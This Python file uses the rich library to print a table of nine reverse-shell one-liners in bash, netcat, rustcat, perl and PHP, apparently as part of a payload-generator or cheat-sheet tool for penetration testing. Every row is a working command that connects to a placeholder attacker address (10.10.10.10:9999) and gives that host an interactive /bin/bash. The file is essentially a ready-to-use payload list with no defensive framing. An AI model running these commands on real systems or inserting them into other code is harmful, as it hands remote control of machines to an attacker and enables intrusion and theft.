from rich.console import Console
from rich.table import Table

def the_list():
    console = Console()
    table = Table(show_header=True, header_style="bold cyan2")
    table.add_column("ID")
    table.add_column("Name")
    table.add_column("Preview")
    table.add_row(
        "[bold]1",
        "[bold]bash tcp",
        "[red]/bin/bash[/] -i >& /dev/tcp/[green]10.10.10.10[/]/[green]9999[/] 0>&1"
    )
    table.add_row(
        "[bold]2",
        "[bold]bash udp",
        "[red]/bin/bash[/] -i >& /dev/udp/[green]10.10.10.10[/]/[green]9999[/] 0>&1"
    )
    table.add_row(
        "[bold]3",
        "[bold]nc -c",
        "nc -c [red]/bin/bash[/] [green]10.10.10.10 9999[/]"
    )
    table.add_row(
        "[bold]4",
        "[bold]nc -e",
        "nc -e [red]/bin/bash[/] [green]10.10.10.10 9999[/]"
    )
    table.add_row(
        "[bold]5",
        "[bold]nc mkfifo",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|[red]/bin/bash[/] -i 2>&1|nc [green]10.10.10.10 9999[/] >/tmp/f"
    )
    table.add_row(
        "[bold]6",
        "[bold]rustcat",
        "rcat [green]10.10.10.10 9999[/] -r [red]/bin/bash[/]"
    )
    table.add_row(
        "[bold]7",
        "[bold]perl",
        "perl -e 'use Socket;$i=\"[green]10.10.10.10[/]\";$p=[green]9999[/];socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"[red]/bin/bash[/] -i\");};'"
    )
    table.add_row(
        "[bold]8",
        "[bold]PHP exec",
        "php -r '$sock=fsockopen(\"[green]10.10.10.10[/]\",[green]9999[/]);exec(\"[red]/bin/bash[/] <&3 >&3 2>&3\");'"
    )
    table.add_row(
        "[bold]9",
        "[bold]PHP shell_exec",
        "php -r '$sock=fsockopen(\"[green]10.10.10.10[/]\",[green]9999[/]);shell_exec(\"[red]/bin/bash[/] <&3 >&3 2>&3\");'"
    )

    console.print(table)